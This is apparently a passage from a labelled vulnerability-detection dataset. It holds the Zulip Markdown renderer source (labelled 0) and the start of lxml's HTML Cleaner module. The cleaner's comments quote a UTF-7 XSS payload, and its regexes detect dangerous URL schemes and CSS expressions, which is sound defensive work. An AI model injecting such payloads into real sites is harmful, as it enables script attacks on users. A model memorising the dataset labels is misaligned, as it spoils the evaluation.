        id_syntax_match = re.match(r'.+\\|(?P<user_id>\\d+)$', name)\n            if id_syntax_match:\n                id = id_syntax_match.group(\"user_id\")\n                user = db_data['mention_data'].get_user_by_id(id)\n            else:\n                user = db_data['mention_data'].get_user_by_name(name)\n\n            if wildcard:\n                self.markdown.zulip_message.mentions_wildcard = True\n                user_id = \"*\"\n            elif user:\n                if not silent:\n                    self.markdown.zulip_message.mentions_user_ids.add(user['id'])\n                name = user['full_name']\n                user_id = str(user['id'])\n            else:\n                # Don't highlight @mentions that don't refer to a valid user\n                return None\n\n            el = markdown.util.etree.Element(\"span\")\n            el.set('data-user-id', user_id)\n            if silent:\n                el.set('class', 'user-mention silent')\n                el.text = \"%s\" % (name,)\n            else:\n                el.set('class', 'user-mention')\n                el.text = \"@%s\" % (name,)\n            return el\n        return None\n\nclass UserGroupMentionPattern(markdown.inlinepatterns.Pattern):\n    def handleMatch(self, m: Match[str]) -> Optional[Element]:\n        match = m.group(2)\n\n        db_data = self.markdown.zulip_db_data\n        if self.markdown.zulip_message and db_data is not None:\n            name = extract_user_group(match)\n            user_group = db_data['mention_data'].get_user_group(name)\n            if user_group:\n                self.markdown.zulip_message.mentions_user_group_ids.add(user_group.id)\n                name = user_group.name\n                user_group_id = str(user_group.id)\n            else:\n                # Don't highlight @-mentions that don't refer to a valid user\n                # group.\n                return None\n\n            el = markdown.util.etree.Element(\"span\")\n            el.set('class', 'user-group-mention')\n            el.set('data-user-group-id', user_group_id)\n            el.text = \"@%s\" % (name,)\n            return el\n        return None\n\nclass StreamPattern(CompiledPattern):\n    def find_stream_by_name(self, name: Match[str]) -> Optional[Dict[str, Any]]:\n        db_data = self.markdown.zulip_db_data\n        if db_data is None:\n            return None\n        stream = db_data['stream_names'].get(name)\n        return stream\n\n    def handleMatch(self, m: Match[str]) -> Optional[Element]:\n        name = m.group('stream_name')\n\n        if self.markdown.zulip_message:\n            stream = self.find_stream_by_name(name)\n            if stream is None:\n                return None\n            el = markdown.util.etree.Element('a')\n            el.set('class', 'stream')\n            el.set('data-stream-id', str(stream['id']))\n            # TODO: We should quite possibly not be specifying the\n            # href here and instead having the browser auto-add the\n            # href when it processes a message with one of these, to\n            # provide more clarity to API clients.\n            stream_url = encode_stream(stream['id'], name)\n            el.set('href', '/#narrow/stream/{stream_url}'.format(stream_url=stream_url))\n            el.text = '#{stream_name}'.format(stream_name=name)\n            return el\n        return None\n\ndef possible_linked_stream_names(content: str) -> Set[str]:\n    matches = re.findall(STREAM_LINK_REGEX, content, re.VERBOSE)\n    return set(matches)\n\nclass AlertWordsNotificationProcessor(markdown.preprocessors.Preprocessor):\n    def run(self, lines: Iterable[str]) -> Iterable[str]:\n        db_data = self.markdown.zulip_db_data\n        if self.markdown.zulip_message and db_data is not None:\n            # We check for alert words here, the set of which are\n            # dependent on which users may see this message.\n            #\n            # Our caller passes in the list of possible_words.  We\n            # don't do any special rendering; we just append the alert words\n            # we find to the set self.markdown.zulip_message.alert_words.\n\n            realm_words = db_data['possible_words']\n\n            content = '\\n'.join(lines).lower()\n\n            allowed_before_punctuation = \"|\".join([r'\\s', '^', r'[\\(\\\".,\\';\\[\\*`>]'])\n            allowed_after_punctuation = \"|\".join([r'\\s', '$', r'[\\)\\\"\\?:.,\\';\\]!\\*`]'])\n\n            for word in realm_words:\n                escaped = re.escape(word.lower())\n                match_re = re.compile('(?:%s)%s(?:%s)' %\n                                      (allowed_before_punctuation,\n                                       escaped,\n                                       allowed_after_punctuation))\n                if re.search(match_re, content):\n                    self.markdown.zulip_message.alert_words.add(word)\n\n        return lines\n\n# This prevents realm_filters from running on the content of a\n# Markdown link, breaking up the link.  This is a monkey-patch, but it\n# might be worth sending a version of this change upstream.\nclass AtomicLinkPattern(CompiledPattern):\n    def get_element(self, m: Match[str]) -> Optional[Element]:\n        href = m.group(9)\n        if not href:\n            return None\n\n        if href[0] == \"<\":\n            href = href[1:-1]\n        href = sanitize_url(self.unescape(href.strip()))\n        if href is None:\n            return None\n\n        db_data = self.markdown.zulip_db_data\n        href = rewrite_local_links_to_relative(db_data, href)\n\n        el = markdown.util.etree.Element('a')\n        el.text = m.group(2)\n        el.set('href', href)\n        fixup_link(el, target_blank=(href[:1] != '#'))\n        return el\n\n    def handleMatch(self, m: Match[str]) -> Optional[Element]:\n        ret = self.get_element(m)\n        if ret is None:\n            return None\n        if not isinstance(ret, str):\n            ret.text = markdown.util.AtomicString(ret.text)\n        return ret\n\ndef get_sub_registry(r: markdown.util.Registry, keys: List[str]) -> markdown.util.Registry:\n    # Registry is a new class added by py-markdown to replace Ordered List.\n    # Since Registry doesn't support .keys(), it is easier to make a new\n    # object instead of removing keys from the existing object.\n    new_r = markdown.util.Registry()\n    for k in keys:\n        new_r.register(r[k], k, r.get_index_for_name(k))\n    return new_r\n\n# These are used as keys (\"realm_filters_keys\") to md_engines and the respective\n# realm filter caches\nDEFAULT_BUGDOWN_KEY = -1\nZEPHYR_MIRROR_BUGDOWN_KEY = -2\n\nclass Bugdown(markdown.Markdown):\n    def __init__(self, *args: Any, **kwargs: Union[bool, int, List[Any]]) -> None:\n        # define default configs\n        self.config = {\n            \"realm_filters\": [kwargs['realm_filters'],\n                              \"Realm-specific filters for realm_filters_key %s\" % (kwargs['realm'],)],\n            \"realm\": [kwargs['realm'], \"Realm id\"],\n            \"code_block_processor_disabled\": [kwargs['code_block_processor_disabled'],\n                                              \"Disabled for email gateway\"]\n        }\n\n        super().__init__(*args, **kwargs)\n        self.set_output_format('html')\n\n    def build_parser(self) -> markdown.Markdown:\n        # Build the parser using selected default features from py-markdown.\n        # The complete list of all available processors can be found in the\n        # super().build_parser() function.\n        #\n        # Note: for any py-markdown updates, manually check if we want any\n        # of the new features added upstream or not; they wouldn't get\n        # included by default.\n        self.preprocessors = self.build_preprocessors()\n        self.parser = self.build_block_parser()\n        self.inlinePatterns = self.build_inlinepatterns()\n        self.treeprocessors = self.build_treeprocessors()\n        self.postprocessors = self.build_postprocessors()\n        self.handle_zephyr_mirror()\n        return self\n\n    def build_preprocessors(self) -> markdown.util.Registry:\n        # We disable the following preprocessors from upstream:\n        #\n        # html_block - insecure\n        # reference - references don't make sense in a chat context.\n        preprocessors = markdown.util.Registry()\n        preprocessors.register(AutoNumberOListPreprocessor(self), 'auto_number_olist', 40)\n        preprocessors.register(BugdownUListPreprocessor(self), 'hanging_ulists', 35)\n        preprocessors.register(markdown.preprocessors.NormalizeWhitespace(self), 'normalize_whitespace', 30)\n        preprocessors.register(fenced_code.FencedBlockPreprocessor(self), 'fenced_code_block', 25)\n        preprocessors.register(AlertWordsNotificationProcessor(self), 'custom_text_notifications', 20)\n        return preprocessors\n\n    def build_block_parser(self) -> markdown.util.Registry:\n        # We disable the following blockparsers from upstream:\n        #\n        # indent - replaced by ours\n        # hashheader - disabled, since headers look bad and don't make sense in a chat context.\n        # setextheader - disabled, since headers look bad and don't make sense in a chat context.\n        # olist - replaced by ours\n        # ulist - replaced by ours\n        # quote - replaced by ours\n        parser = markdown.blockprocessors.BlockParser(self)\n        parser.blockprocessors.register(markdown.blockprocessors.EmptyBlockProcessor(parser), 'empty', 85)\n        if not self.getConfig('code_block_processor_disabled'):\n            parser.blockprocessors.register(markdown.blockprocessors.CodeBlockProcessor(parser), 'code', 80)\n        # We get priority 75 from 'table' extension\n        parser.blockprocessors.register(markdown.blockprocessors.HRProcessor(parser), 'hr', 70)\n        parser.blockprocessors.register(UListProcessor(parser), 'ulist', 65)\n        parser.blockprocessors.register(ListIndentProcessor(parser), 'indent', 60)\n        parser.blockprocessors.register(BlockQuoteProcessor(parser), 'quote', 55)\n        parser.blockprocessors.register(markdown.blockprocessors.ParagraphProcessor(parser), 'paragraph', 50)\n        return parser\n\n    def build_inlinepatterns(self) -> markdown.util.Registry:\n        # We disable the following upstream inline patterns:\n        #\n        # backtick -        replaced by ours\n        # escape -          probably will re-add at some point.\n        # link -            replaced by ours\n        # image_link -      replaced by ours\n        # autolink -        replaced by ours\n        # automail -        replaced by ours\n        # linebreak -       we use nl2br and consider that good enough\n        # html -            insecure\n        # reference -       references not useful\n        # image_reference - references not useful\n        # short_reference - references not useful\n        # ---------------------------------------------------\n        # strong_em -       for these three patterns,\n        # strong2 -         we have our own versions where\n        # emphasis2 -       we disable _ for bold and emphasis\n\n        # Declare regexes for clean single line calls to .register().\n        NOT_STRONG_RE = markdown.inlinepatterns.NOT_STRONG_RE\n        # Custom strikethrough syntax: ~~foo~~\n        DEL_RE = r'(?<!~)(\\~\\~)([^~\\n]+?)(\\~\\~)(?!~)'\n        # Custom bold syntax: **foo** but not __foo__\n        # str inside ** must start and end with a word character\n        # it need for things like \"const char *x = (char *)y\"\n        EMPHASIS_RE = r'(\\*)(?!\\s+)([^\\*^\\n]+)(?<!\\s)\\*'\n        ENTITY_RE = markdown.inlinepatterns.ENTITY_RE\n        STRONG_EM_RE = r'(\\*\\*\\*)(?!\\s+)([^\\*^\\n]+)(?<!\\s)\\*\\*\\*'\n        # Inline code block without whitespace stripping\n        BACKTICK_RE = r'(?:(?<!\\\\)((?:\\\\{2})+)(?=`+)|(?<!\\\\)(`+)(.+?)(?<!`)\\3(?!`))'\n\n        # Add Inline Patterns.  We use a custom numbering of the\n        # rules, that preserves the order from upstream but leaves\n        # space for us to add our own.\n        reg = markdown.util.Registry()\n        reg.register(BacktickPattern(BACKTICK_RE), 'backtick', 105)\n        reg.register(markdown.inlinepatterns.DoubleTagPattern(STRONG_EM_RE, 'strong,em'), 'strong_em', 100)\n        reg.register(UserMentionPattern(mention.find_mentions, self), 'usermention', 95)\n        reg.register(Tex(r'\\B(?<!\\$)\\$\\$(?P<body>[^\\n_$](\\\\\\$|[^$\\n])*)\\$\\$(?!\\$)\\B'), 'tex', 90)\n        reg.register(StreamPattern(get_compiled_stream_link_regex(), self), 'stream', 85)\n        reg.register(Avatar(AVATAR_REGEX, self), 'avatar', 80)\n        reg.register(ModalLink(r'!modal_link\\((?P<relative_url>[^)]*), (?P<text>[^)]*)\\)'), 'modal_link', 75)\n        # Note that !gravatar syntax should be deprecated long term.\n        reg.register(Avatar(GRAVATAR_REGEX, self), 'gravatar', 70)\n        reg.register(UserGroupMentionPattern(mention.user_group_mentions, self), 'usergroupmention', 65)\n        reg.register(AtomicLinkPattern(get_link_re(), self), 'link', 60)\n        reg.register(AutoLink(get_web_link_regex(), self), 'autolink', 55)\n        # Reserve priority 45-54 for Realm Filters\n        reg = self.register_realm_filters(reg)\n        reg.register(markdown.inlinepatterns.HtmlInlineProcessor(ENTITY_RE, self), 'entity', 40)\n        reg.register(markdown.inlinepatterns.SimpleTagPattern(r'(\\*\\*)([^\\n]+?)\\2', 'strong'), 'strong', 35)\n        reg.register(markdown.inlinepatterns.SimpleTagPattern(EMPHASIS_RE, 'em'), 'emphasis', 30)\n        reg.register(markdown.inlinepatterns.SimpleTagPattern(DEL_RE, 'del'), 'del', 25)\n        reg.register(markdown.inlinepatterns.SimpleTextInlineProcessor(NOT_STRONG_RE), 'not_strong', 20)\n        reg.register(Emoji(EMOJI_REGEX, self), 'emoji', 15)\n        reg.register(EmoticonTranslation(emoticon_regex, self), 'translate_emoticons', 10)\n        # We get priority 5 from 'nl2br' extension\n        reg.register(UnicodeEmoji(unicode_emoji_regex), 'unicodeemoji', 0)\n        return reg\n\n    def register_realm_filters(self, inlinePatterns: markdown.util.Registry) -> markdown.util.Registry:\n        for (pattern, format_string, id) in self.getConfig(\"realm_filters\"):\n            inlinePatterns.register(RealmFilterPattern(pattern, format_string, self),\n                                    'realm_filters/%s' % (pattern), 45)\n        return inlinePatterns\n\n    def build_treeprocessors(self) -> markdown.util.Registry:\n        # Here we build all the processors from upstream, plus a few of our own.\n        treeprocessors = markdown.util.Registry()\n        # We get priority 30 from 'hilite' extension\n        treeprocessors.register(markdown.treeprocessors.InlineProcessor(self), 'inline', 25)\n        treeprocessors.register(markdown.treeprocessors.PrettifyTreeprocessor(self), 'prettify', 20)\n        treeprocessors.register(InlineInterestingLinkProcessor(self), 'inline_interesting_links', 15)\n        if settings.CAMO_URI:\n            treeprocessors.register(InlineHttpsProcessor(self), 'rewrite_to_https', 10)\n        return treeprocessors\n\n    def build_postprocessors(self) -> markdown.util.Registry:\n        # These are the default python-markdown processors, unmodified.\n        postprocessors = markdown.util.Registry()\n        postprocessors.register(markdown.postprocessors.RawHtmlPostprocessor(self), 'raw_html', 20)\n        postprocessors.register(markdown.postprocessors.AndSubstitutePostprocessor(), 'amp_substitute', 15)\n        postprocessors.register(markdown.postprocessors.UnescapePostprocessor(), 'unescape', 10)\n        return postprocessors\n\n    def getConfig(self, key: str, default: str='') -> Any:\n        \"\"\" Return a setting for the given key or an empty string. \"\"\"\n        if key in self.config:\n            return self.config[key][0]\n        else:\n            return default\n\n    def handle_zephyr_mirror(self) -> None:\n        if self.getConfig(\"realm\") == ZEPHYR_MIRROR_BUGDOWN_KEY:\n            # Disable almost all inline patterns for zephyr mirror\n            # users' traffic that is mirrored.  Note that\n            # inline_interesting_links is a treeprocessor and thus is\n            # not removed\n            self.inlinePatterns = get_sub_registry(self.inlinePatterns, ['autolink'])\n            self.treeprocessors = get_sub_registry(self.treeprocessors, ['inline_interesting_links',\n                                                                         'rewrite_to_https'])\n            # insert new 'inline' processor because we have changed self.inlinePatterns\n            # but InlineProcessor copies md as self.md in __init__.\n            self.treeprocessors.register(markdown.treeprocessors.InlineProcessor(self), 'inline', 25)\n            self.preprocessors = get_sub_registry(self.preprocessors, ['custom_text_notifications'])\n            self.parser.blockprocessors = get_sub_registry(self.parser.blockprocessors, ['paragraph'])\n\nmd_engines = {}  # type: Dict[Tuple[int, bool], markdown.Markdown]\nrealm_filter_data = {}  # type: Dict[int, List[Tuple[str, str, int]]]\n\ndef make_md_engine(realm_filters_key: int, email_gateway: bool) -> None:\n    md_engine_key = (realm_filters_key, email_gateway)\n    if md_engine_key in md_engines:\n        del md_engines[md_engine_key]\n\n    realm_filters = realm_filter_data[realm_filters_key]\n    md_engines[md_engine_key] = build_engine(\n        realm_filters=realm_filters,\n        realm_filters_key=realm_filters_key,\n        email_gateway=email_gateway,\n    )\n\ndef build_engine(realm_filters: List[Tuple[str, str, int]],\n                 realm_filters_key: int,\n                 email_gateway: bool) -> markdown.Markdown:\n    engine = Bugdown(\n        realm_filters=realm_filters,\n        realm=realm_filters_key,\n        code_block_processor_disabled=email_gateway,\n        extensions = [\n            nl2br.makeExtension(),\n            tables.makeExtension(),\n            codehilite.makeExtension(\n                linenums=False,\n                guess_lang=False\n            ),\n        ])\n    return engine\n\ndef topic_links(realm_filters_key: int, topic_name: str) -> List[str]:\n    matches = []  # type: List[str]\n\n    realm_filters = realm_filters_for_realm(realm_filters_key)\n\n    for realm_filter in realm_filters:\n        pattern = prepare_realm_pattern(realm_filter[0])\n        for m in re.finditer(pattern, topic_name):\n            matches += [realm_filter[1] % m.groupdict()]\n    return matches\n\ndef maybe_update_markdown_engines(realm_filters_key: Optional[int], email_gateway: bool) -> None:\n    # If realm_filters_key is None, load all filters\n    global realm_filter_data\n    if realm_filters_key is None:\n        all_filters = all_realm_filters()\n        all_filters[DEFAULT_BUGDOWN_KEY] = []\n        for realm_filters_key, filters in all_filters.items():\n            realm_filter_data[realm_filters_key] = filters\n            make_md_engine(realm_filters_key, email_gateway)\n        # Hack to ensure that getConfig(\"realm\") is right for mirrored Zephyrs\n        realm_filter_data[ZEPHYR_MIRROR_BUGDOWN_KEY] = []\n        make_md_engine(ZEPHYR_MIRROR_BUGDOWN_KEY, False)\n    else:\n        realm_filters = realm_filters_for_realm(realm_filters_key)\n        if realm_filters_key not in realm_filter_data or    \\\n                realm_filter_data[realm_filters_key] != realm_filters:\n            # Realm filters data has changed, update `realm_filter_data` and any\n            # of the existing markdown engines using this set of realm filters.\n            realm_filter_data[realm_filters_key] = realm_filters\n            for email_gateway_flag in [True, False]:\n                if (realm_filters_key, email_gateway_flag) in md_engines:\n                    # Update only existing engines(if any), don't create new one.\n                    make_md_engine(realm_filters_key, email_gateway_flag)\n\n        if (realm_filters_key, email_gateway) not in md_engines:\n            # Markdown engine corresponding to this key doesn't exists so create one.\n            make_md_engine(realm_filters_key, email_gateway)\n\n# We want to log Markdown parser failures, but shouldn't log the actual input\n# message for privacy reasons.  The compromise is to replace all alphanumeric\n# characters with 'x'.\n#\n# We also use repr() to improve reproducibility, and to escape terminal control\n# codes, which can do surprisingly nasty things.\n_privacy_re = re.compile('\\\\w', flags=re.UNICODE)\ndef privacy_clean_markdown(content: str) -> str:\n    return repr(_privacy_re.sub('x', content))\n\ndef log_bugdown_error(msg: str) -> None:\n    \"\"\"We use this unusual logging approach to log the bugdown error, in\n    order to prevent AdminNotifyHandler from sending the santized\n    original markdown formatting into another Zulip message, which\n    could cause an infinite exception loop.\"\"\"\n    bugdown_logger.error(msg)\n\ndef get_email_info(realm_id: int, emails: Set[str]) -> Dict[str, FullNameInfo]:\n    if not emails:\n        return dict()\n\n    q_list = {\n        Q(email__iexact=email.strip().lower())\n        for email in emails\n    }\n\n    rows = UserProfile.objects.filter(\n        realm_id=realm_id\n    ).filter(\n        functools.reduce(lambda a, b: a | b, q_list),\n    ).values(\n        'id',\n        'email',\n    )\n\n    dct = {\n        row['email'].strip().lower(): row\n        for row in rows\n    }\n    return dct\n\ndef get_possible_mentions_info(realm_id: int, mention_texts: Set[str]) -> List[FullNameInfo]:\n    if not mention_texts:\n        return list()\n\n    # Remove the trailing part of the `name|id` mention syntax,\n    # thus storing only full names in full_names.\n    full_names = set()\n    name_re = r'(?P<full_name>.+)\\|\\d+$'\n    for mention_text in mention_texts:\n        name_syntax_match = re.match(name_re, mention_text)\n        if name_syntax_match:\n            full_names.add(name_syntax_match.group(\"full_name\"))\n        else:\n            full_names.add(mention_text)\n\n    q_list = {\n        Q(full_name__iexact=full_name)\n        for full_name in full_names\n    }\n\n    rows = UserProfile.objects.filter(\n        realm_id=realm_id,\n        is_active=True,\n    ).filter(\n        functools.reduce(lambda a, b: a | b, q_list),\n    ).values(\n        'id',\n        'full_name',\n        'email',\n    )\n    return list(rows)\n\nclass MentionData:\n    def __init__(self, realm_id: int, content: str) -> None:\n        mention_texts = possible_mentions(content)\n        possible_mentions_info = get_possible_mentions_info(realm_id, mention_texts)\n        self.full_name_info = {\n            row['full_name'].lower(): row\n            for row in possible_mentions_info\n        }\n        self.user_id_info = {\n            row['id']: row\n            for row in possible_mentions_info\n        }\n        self.init_user_group_data(realm_id=realm_id, content=content)\n\n    def init_user_group_data(self,\n                             realm_id: int,\n                             content: str) -> None:\n        user_group_names = possible_user_group_mentions(content)\n        self.user_group_name_info = get_user_group_name_info(realm_id, user_group_names)\n        self.user_group_members = defaultdict(list)  # type: Dict[int, List[int]]\n        group_ids = [group.id for group in self.user_group_name_info.values()]\n\n        if not group_ids:\n            # Early-return to avoid the cost of hitting the ORM,\n            # which shows up in profiles.\n            return\n\n        membership = UserGroupMembership.objects.filter(user_group_id__in=group_ids)\n        for info in membership.values('user_group_id', 'user_profile_id'):\n            group_id = info['user_group_id']\n            user_profile_id = info['user_profile_id']\n            self.user_group_members[group_id].append(user_profile_id)\n\n    def get_user_by_name(self, name: str) -> Optional[FullNameInfo]:\n        # warning: get_user_by_name is not dependable if two\n        # users of the same full name are mentioned. Use\n        # get_user_by_id where possible.\n        return self.full_name_info.get(name.lower(), None)\n\n    def get_user_by_id(self, id: str) -> Optional[FullNameInfo]:\n        return self.user_id_info.get(int(id), None)\n\n    def get_user_ids(self) -> Set[int]:\n        \"\"\"\n        Returns the user IDs that might have been mentioned by this\n        content.  Note that because this data structure has not parsed\n        the message and does not know about escaping/code blocks, this\n        will overestimate the list of user ids.\n        \"\"\"\n        return set(self.user_id_info.keys())\n\n    def get_user_group(self, name: str) -> Optional[UserGroup]:\n        return self.user_group_name_info.get(name.lower(), None)\n\n    def get_group_members(self, user_group_id: int) -> List[int]:\n        return self.user_group_members.get(user_group_id, [])\n\ndef get_user_group_name_info(realm_id: int, user_group_names: Set[str]) -> Dict[str, UserGroup]:\n    if not user_group_names:\n        return dict()\n\n    rows = UserGroup.objects.filter(realm_id=realm_id,\n                                    name__in=user_group_names)\n    dct = {row.name.lower(): row for row in rows}\n    return dct\n\ndef get_stream_name_info(realm: Realm, stream_names: Set[str]) -> Dict[str, FullNameInfo]:\n    if not stream_names:\n        return dict()\n\n    q_list = {\n        Q(name=name)\n        for name in stream_names\n    }\n\n    rows = get_active_streams(\n        realm=realm,\n    ).filter(\n        functools.reduce(lambda a, b: a | b, q_list),\n    ).values(\n        'id',\n        'name',\n    )\n\n    dct = {\n        row['name']: row\n        for row in rows\n    }\n    return dct\n\n\ndef do_convert(content: str,\n               message: Optional[Message]=None,\n               message_realm: Optional[Realm]=None,\n               possible_words: Optional[Set[str]]=None,\n               sent_by_bot: Optional[bool]=False,\n               translate_emoticons: Optional[bool]=False,\n               mention_data: Optional[MentionData]=None,\n               email_gateway: Optional[bool]=False,\n               no_previews: Optional[bool]=False) -> str:\n    \"\"\"Convert Markdown to HTML, with Zulip-specific settings and hacks.\"\"\"\n    # This logic is a bit convoluted, but the overall goal is to support a range of use cases:\n    # * Nothing is passed in other than content -> just run default options (e.g. for docs)\n    # * message is passed, but no realm is -> look up realm from message\n    # * message_realm is passed -> use that realm for bugdown purposes\n    if message is not None:\n        if message_realm is None:\n            message_realm = message.get_realm()\n    if message_realm is None:\n        realm_filters_key = DEFAULT_BUGDOWN_KEY\n    else:\n        realm_filters_key = message_realm.id\n\n    if message and hasattr(message, 'id') and message.id:\n        logging_message_id = 'id# ' + str(message.id)\n    else:\n        logging_message_id = 'unknown'\n\n    if message is not None and message_realm is not None:\n        if message_realm.is_zephyr_mirror_realm:\n            if message.sending_client.name == \"zephyr_mirror\":\n                # Use slightly customized Markdown processor for content\n                # delivered via zephyr_mirror\n                realm_filters_key = ZEPHYR_MIRROR_BUGDOWN_KEY\n\n    maybe_update_markdown_engines(realm_filters_key, email_gateway)\n    md_engine_key = (realm_filters_key, email_gateway)\n\n    if md_engine_key in md_engines:\n        _md_engine = md_engines[md_engine_key]\n    else:\n        if DEFAULT_BUGDOWN_KEY not in md_engines:\n            maybe_update_markdown_engines(realm_filters_key=None, email_gateway=False)\n\n        _md_engine = md_engines[(DEFAULT_BUGDOWN_KEY, email_gateway)]\n    # Reset the parser; otherwise it will get slower over time.\n    _md_engine.reset()\n\n    # Filters such as UserMentionPattern need a message.\n    _md_engine.zulip_message = message\n    _md_engine.zulip_realm = message_realm\n    _md_engine.zulip_db_data = None  # for now\n    _md_engine.image_preview_enabled = image_preview_enabled(\n        message, message_realm, no_previews)\n    _md_engine.url_embed_preview_enabled = url_embed_preview_enabled(\n        message, message_realm, no_previews)\n\n    # Pre-fetch data from the DB that is used in the bugdown thread\n    if message is not None:\n        assert message_realm is not None  # ensured above if message is not None\n        if possible_words is None:\n            possible_words = set()  # Set[str]\n\n        # Here we fetch the data structures needed to render\n        # mentions/avatars/stream mentions from the database, but only\n        # if there is syntax in the message that might use them, since\n        # the fetches are somewhat expensive and these types of syntax\n        # are uncommon enough that it's a useful optimization.\n\n        if mention_data is None:\n            mention_data = MentionData(message_realm.id, content)\n\n        emails = possible_avatar_emails(content)\n        email_info = get_email_info(message_realm.id, emails)\n\n        stream_names = possible_linked_stream_names(content)\n        stream_name_info = get_stream_name_info(message_realm, stream_names)\n\n        if content_has_emoji_syntax(content):\n            active_realm_emoji = message_realm.get_active_emoji()\n        else:\n            active_realm_emoji = dict()\n\n        _md_engine.zulip_db_data = {\n            'possible_words': possible_words,\n            'email_info': email_info,\n            'mention_data': mention_data,\n            'active_realm_emoji': active_realm_emoji,\n            'realm_uri': message_realm.uri,\n            'sent_by_bot': sent_by_bot,\n            'stream_names': stream_name_info,\n            'translate_emoticons': translate_emoticons,\n        }\n\n    try:\n        # Spend at most 5 seconds rendering; this protects the backend\n        # from being overloaded by bugs (e.g. markdown logic that is\n        # extremely inefficient in corner cases) as well as user\n        # errors (e.g. a realm filter that makes some syntax\n        # infinite-loop).\n        rendered_content = timeout(5, _md_engine.convert, content)\n\n        # Throw an exception if the content is huge; this protects the\n        # rest of the codebase from any bugs where we end up rendering\n        # something huge.\n        if len(rendered_content) > MAX_MESSAGE_LENGTH * 10:\n            raise BugdownRenderingException('Rendered content exceeds %s characters (message %s)' %\n                                            (MAX_MESSAGE_LENGTH * 10, logging_message_id))\n        return rendered_content\n    except Exception:\n        cleaned = privacy_clean_markdown(content)\n        # NOTE: Don't change this message without also changing the\n        # logic in logging_handlers.py or we can create recursive\n        # exceptions.\n        exception_message = ('Exception in Markdown parser: %sInput (sanitized) was: %s\\n (message %s)'\n                             % (traceback.format_exc(), cleaned, logging_message_id))\n        bugdown_logger.exception(exception_message)\n\n        raise BugdownRenderingException()\n    finally:\n        # These next three lines are slightly paranoid, since\n        # we always set these right before actually using the\n        # engine, but better safe then sorry.\n        _md_engine.zulip_message = None\n        _md_engine.zulip_realm = None\n        _md_engine.zulip_db_data = None\n\nbugdown_time_start = 0.0\nbugdown_total_time = 0.0\nbugdown_total_requests = 0\n\ndef get_bugdown_time() -> float:\n    return bugdown_total_time\n\ndef get_bugdown_requests() -> int:\n    return bugdown_total_requests\n\ndef bugdown_stats_start() -> None:\n    global bugdown_time_start\n    bugdown_time_start = time.time()\n\ndef bugdown_stats_finish() -> None:\n    global bugdown_total_time\n    global bugdown_total_requests\n    global bugdown_time_start\n    bugdown_total_requests += 1\n    bugdown_total_time += (time.time() - bugdown_time_start)\n\ndef convert(content: str,\n            message: Optional[Message]=None,\n            message_realm: Optional[Realm]=None,\n            possible_words: Optional[Set[str]]=None,\n            sent_by_bot: Optional[bool]=False,\n            translate_emoticons: Optional[bool]=False,\n            mention_data: Optional[MentionData]=None,\n            email_gateway: Optional[bool]=False,\n            no_previews: Optional[bool]=False) -> str:\n    bugdown_stats_start()\n    ret = do_convert(content, message, message_realm,\n                     possible_words, sent_by_bot, translate_emoticons,\n                     mention_data, email_gateway, no_previews=no_previews)\n    bugdown_stats_finish()\n    return ret\n", "target": 0}
{"idx": 1040, "func": "\"\"\"A cleanup tool for HTML.\n\nRemoves unwanted tags and content.  See the `Cleaner` class for\ndetails.\n\"\"\"\n\nimport re\nimport copy\ntry:\n    from urlparse import urlsplit\nexcept ImportError:\n    # Python 3\n    from urllib.parse import urlsplit\nfrom lxml import etree\nfrom lxml.html import defs\nfrom lxml.html import fromstring, XHTML_NAMESPACE\nfrom lxml.html import xhtml_to_html, _transform_result\n\ntry:\n    unichr\nexcept NameError:\n    # Python 3\n    unichr = chr\ntry:\n    unicode\nexcept NameError:\n    # Python 3\n    unicode = str\ntry:\n    bytes\nexcept NameError:\n    # Python < 2.6\n    bytes = str\ntry:\n    basestring\nexcept NameError:\n    basestring = (str, bytes)\n\n\n__all__ = ['clean_html', 'clean', 'Cleaner', 'autolink', 'autolink_html',\n           'word_break', 'word_break_html']\n\n# Look at http://code.sixapart.com/trac/livejournal/browser/trunk/cgi-bin/cleanhtml.pl\n#   Particularly the CSS cleaning; most of the tag cleaning is integrated now\n# I have multiple kinds of schemes searched; but should schemes be\n#   whitelisted instead?\n# max height?\n# remove images?  Also in CSS?  background attribute?\n# Some way to whitelist object, iframe, etc (e.g., if you want to\n#   allow *just* embedded YouTube movies)\n# Log what was deleted and why?\n# style=\"behavior: ...\" might be bad in IE?\n# Should we have something for just <meta http-equiv>?  That's the worst of the\n#   metas.\n# UTF-7 detections?  Example:\n#     <HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\n#   you don't always have to have the charset set, if the page has no charset\n#   and there's UTF7-like code in it.\n# Look at these tests: http://htmlpurifier.org/live/smoketests/xssAttacks.php\n\n\n# This is an IE-specific construct you can have in a stylesheet to\n# run some Javascript:\n_css_javascript_re = re.compile(\n    r'expression\\s*\\(.*?\\)', re.S|re.I)\n\n# Do I have to worry about @\\nimport?\n_css_import_re = re.compile(\n    r'@\\s*import', re.I)\n\n# All kinds of schemes besides just javascript: that can cause\n# execution:\n_is_image_dataurl = re.compile(\n    r'^data:image/.+;base64', re.I).search\n_is_possibly_malicious_scheme = re.compile(\n    r'(?:javascript|jscript|livescript|vbscript|data|about|mocha):',\n    re.I).search\ndef _is_javascript_scheme(s):\n    if _is_image_dataurl(s):\n        return None\n    return _is_possibly_malicious_scheme(s)\n\n_substitute_whitespace = re.compile(r'[\\s\\x00-\\x08\\x0B\\x0C\\x0E-\\x19]+').sub\n# FIXME: should data: be blocked?\n\n# FIXME: check against: http://msdn2.microsoft.com/en-us/library/ms537512.aspx\n_conditional_comment_re = re.compile(\n    r'\\[if[\\s\\n\\r]+.*?][\\s\\n\\r]*>', re.I|re.S)\n\n_find_styled_elements = etree.XPath(\n    \"descendant-or-self::*[@style]\")\n\n_find_external_links = etree.XPath(\n    (\"descendant-or-self::a  [normalize-space(@href) and substring(normalize-space(@href),1,1) != '#'] |\"\n     \"descendant-or-self::x:a[normalize-space(@href) and substring(normalize-space(@href),1,1) != '#']\"),\n    namespaces={'x':XHTML_NAMESPACE})\n\n\nclass Cleaner(object):\n    \"\"\"\n    Instances cleans the document of each of the possible offending\n    elements.  The cleaning is controlled by attributes; you can\n    override attributes in a subclass, or set them in the constructor.\n\n    ``scripts``:\n        Removes any ``<script>`` tags.\n\n    ``javascript``:\n        Removes any Javascript, like an ``onclick`` attribute. Also removes stylesheets\n        as they could contain Javascript.\n\n    ``comments``:\n        Removes any comments.\n\n    ``style``:\n        Removes any style tags.\n\n    ``inline_style``\n        Removes any style attributes.  Defaults to the value of the ``style`` option.\n\n    